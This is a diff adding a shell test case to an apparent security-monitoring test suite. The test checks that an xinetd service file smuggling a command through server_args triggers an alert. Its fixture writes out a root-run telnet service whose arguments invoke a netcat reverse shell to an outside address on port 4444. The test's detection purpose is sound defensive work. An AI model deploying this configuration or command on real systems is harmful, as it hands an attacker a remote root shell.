@@ -286,3 +286,30 @@ EOF
     # Current behavior: # server= line IS scanned + alert IS raised.
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (server_args carries injection pattern → alert): xinetd server_args expansion lets attacker pass cleartext args to server)" {
+    # Sister to the server= axis already locked. xinetd's server_args
+    # directive is the cleartext argument list passed to the
+    # legitimate server binary — but an attacker may smuggle shell
+    # metacharacters / redirect operators into server_args if the
+    # server binary is a wrapper that re-shells its args (a common
+    # legacy pattern). Lock detection of injection patterns in the
+    # server_args field alongside the server= path family.
+    xsvc /usr/sbin/in.telnetd > "${SVC}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${SVC}" <<EOF
+service telnet
+{
+    socket_type = stream
+    protocol = tcp
+    wait = no
+    user = root
+    server = /bin/sh
+    server_args = -c "nc -e /bin/sh 1.1.1.1 4444"
+    disable = no
+}
+EOF
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
